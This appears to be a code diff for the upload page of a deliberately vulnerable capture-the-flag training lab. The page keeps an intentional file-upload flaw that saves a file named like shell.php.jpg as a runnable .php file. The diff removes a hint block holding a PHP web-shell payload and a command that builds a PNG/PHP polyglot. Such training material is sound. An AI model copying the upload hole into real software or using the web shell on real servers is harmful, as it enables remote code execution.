@@ -1,6 +1,5 @@
 <?php
 session_start();
-loadEnv(__DIR__ . '/../.env');
 
 function loadEnv($path) {
     if (!file_exists($path)) return;
@@ -11,10 +10,45 @@ function loadEnv($path) {
         $_ENV[trim($key)] = trim($value);
     }
 }
+loadEnv(__DIR__ . '/../.env');
 
 // Check QA mode (set by Stage 4)
 if (!isset($_SESSION['qa']) || $_SESSION['qa'] !== 1) {
-    die('<h1>Access Denied</h1><p>QA Mode not enabled. Complete Stage 4 first.</p>');
+    die('
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Upload - LOCTH Lab</title>
+        <style>
+            body {
+                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+            .container {
+                background: white;
+                border-radius: 20px;
+                padding: 50px;
+                text-align: center;
+                max-width: 500px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            }
+            h1 { color: #dc3545; margin-bottom: 20px; }
+            p { color: #666; font-size: 1.1em; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Access Denied</h1>
+            <p>QA Mode not enabled. Complete Stage 4 first.</p>
+        </div>
+    </body>
+    </html>
+    ');
 }
 
 $message = '';
@@ -27,7 +61,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     // Layer 1: Content-Type check (weak - trusts client)
     $content_type = $file['type'];
     if ($content_type !== 'image/png' && $content_type !== 'image/jpeg') {
-        $message = 'Error: Only PNG and JPEG images allowed (Content-Type check)';
+        $message = 'Error: Only PNG and JPEG images allowed';
     } else {
         // Layer 2: Extension check (weak - only checks last extension)
         $filename = $file['name'];
@@ -45,10 +79,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
                 $message = 'Error: File content does not match image format';
             } else {
                 // BUG: Normalize filename but save with FIRST extension
-                // Example: shell.php.jpg -> extracts 'php' as first extension
                 $parts = explode('.', $filename);
                 if (count($parts) > 2) {
-                    // Double extension detected - take FIRST extension (bug!)
                     $normalized_ext = $parts[1];
                     $base_name = $parts[0];
                     $final_name = $base_name . '.' . $normalized_ext;
@@ -62,7 +94,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
                     $uploaded_file = $final_name;
                     $message = "Success! File uploaded as: $final_name";
                     
-                    // Check if this completes Stage 5
                     if (strpos($final_name, '.php') !== false) {
                         $_SESSION['progress'] = max($_SESSION['progress'] ?? 0, 5);
                     }
@@ -77,63 +108,186 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>File Upload - LOCTH Lab</title>
-    <link rel="stylesheet" href="css/style.css">
+    <title>Upload - LOCTH Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+        
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: white;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 40px;
+        }
+        
+        .upload-box {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            color: #155724;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .error-box {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .upload-area {
+            border: 3px dashed #ddd;
+            border-radius: 10px;
+            padding: 40px;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .upload-area:hover {
+            border-color: #667eea;
+            background: #f8f9fa;
+        }
+        
+        .upload-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            color: #667eea;
+        }
+        
+        input[type="file"] {
+            display: none;
+        }
+        
+        .file-label {
+            color: #666;
+            font-size: 1.1em;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .hint-box {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .hint-box h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+        
+        .hint-box code {
+            background: #f8f9fa;
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: #e83e8c;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        
+        .hint-box p {
+            color: #666;
+            line-height: 1.6;
+            margin: 10px 0;
+        }
+        
+        .selected-file {
+            margin-top: 15px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            color: #555;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>📤 QA File Upload</h1>
-        <p>Welcome to the QA testing area. Upload files for testing.</p>
+        <h1>File Upload</h1>
         
-        <?php if ($message): ?>
-        <div class="<?php echo strpos($message, 'Success') !== false ? 'success-box' : 'error-box'; ?>">
-            <?php echo htmlspecialchars($message); ?>
+        <div class="upload-box">
+            <?php if ($message): ?>
+                <div class="<?php echo strpos($message, 'Success') !== false ? 'success-box' : 'error-box'; ?>">
+                    <?php echo htmlspecialchars($message); ?>
+                </div>
+            <?php endif; ?>
+            
+            <?php if ($uploaded_file): ?>
+                <div class="success-box">
+                    <strong>Next:</strong> Use runner.php to execute<br>
+                    <code>runner.php?f=<?php echo urlencode($uploaded_file); ?>&cmd=id</code>
+                </div>
+            <?php endif; ?>
+            
+            <form method="POST" enctype="multipart/form-data" id="uploadForm">
+                <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+                    <div class="upload-icon">📁</div>
+                    <div class="file-label">Click to select file</div>
+                    <div class="selected-file" id="fileName" style="display: none;"></div>
+                </div>
+                <input type="file" name="file" id="fileInput" required onchange="showFileName()">
+                <button type="submit" class="btn">Upload</button>
+            </form>
         </div>
-        <?php endif; ?>
-        
-        <?php if ($uploaded_file): ?>
-        <div class="info-box">
-            <strong>File uploaded successfully!</strong><br>
-            Filename: <code><?php echo htmlspecialchars($uploaded_file); ?></code><br><br>
-            <strong>Next step:</strong> Use runner.php to execute it<br>
-            Example: <code>/runner.php?f=<?php echo urlencode($uploaded_file); ?>&cmd=id</code>
-        </div>
-        <?php endif; ?>
-        
-        <form method="POST" enctype="multipart/form-data" class="upload-form">
-            <div class="form-group">
-                <label>Select file to upload:</label>
-                <input type="file" name="file" required>
-            </div>
-            <button type="submit" class="btn">Upload</button>
-        </form>
         
         <div class="hint-box">
-            <strong>Stage 5 Hints:</strong>
-            <ul>
-                <li>Layer 1 checks <code>Content-Type</code> - spoof it to <code>image/png</code></li>
-                <li>Layer 2 checks file extension - use double extension like <code>shell.php.jpg</code></li>
-                <li>Layer 3 checks magic bytes - prepend PNG header: <code>\x89PNG\r\n\x1a\n</code></li>
-                <li>Bug: The system saves files with the FIRST extension from double extensions</li>
-                <li>Create a polyglot: PNG magic bytes + PHP code</li>
-                <li>After upload, use <code>runner.php</code> to execute commands</li>
-            </ul>
-            
-            <strong>Example PHP Payload:</strong>
-            <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
-            
-            <strong>How to create the exploit file:</strong>
-            <pre>
-# Create polyglot file with PNG magic bytes + PHP code
-echo -e '\x89PNG\r\n\x1a\n&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php.jpg
-
-# Modify Content-Type in Burp Suite to: image/png
-# Upload via form
-# Access via: /runner.php?f=shell.php&cmd=cat%20../flags/final_flag.txt
-            </pre>
+            <h3>Hints</h3>
+            <p>1. Content-Type image/png</p>
+            <p>2. Double extension</p>
+            <p>3. PNG magic bytes</code></p>
         </div>
-        
-        <a href="flow.php" class="btn-secondary">Back to Flow</a>
     </div>
+    
+    <script>
+        function showFileName() {
+            const input = document.getElementById('fileInput');
+            const display = document.getElementById('fileName');
+            if (input.files.length > 0) {
+                display.textContent = 'Selected: ' + input.files[0].name;
+                display.style.display = 'block';
+            }
+        }
+    </script>
 </body>
 </html>
